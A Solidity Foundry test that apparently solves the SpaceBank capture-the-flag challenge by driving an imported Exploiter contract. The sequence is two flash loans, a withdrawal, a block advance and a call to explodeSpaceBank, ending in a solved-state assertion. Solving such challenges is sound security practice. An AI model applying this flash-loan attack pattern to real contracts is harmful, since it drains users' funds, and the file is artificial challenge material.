// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "src/Challenge.sol";
import "src/SpaceBank.sol";
import "src/Exploiter.sol";

contract SolveTest is Test {
    Challenge challenge;
    SpaceBank spacebank;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("rpc"));
        challenge = Challenge(0xBe827cef2CDE4d5a7C757d12aB9f2145A11F3FaC);
        spacebank = challenge.SPACEBANK();
    }

    function testExploit() public {
        Exploiter exploiter = new Exploiter{value: 1}(spacebank);
        spacebank.flashLoan(500, address(exploiter));
        spacebank.flashLoan(500, address(exploiter));
        exploiter.withdraw(1000);
        vm.roll(block.number + 2);
        spacebank.explodeSpaceBank();
        assert(challenge.isSolved());
    }
}
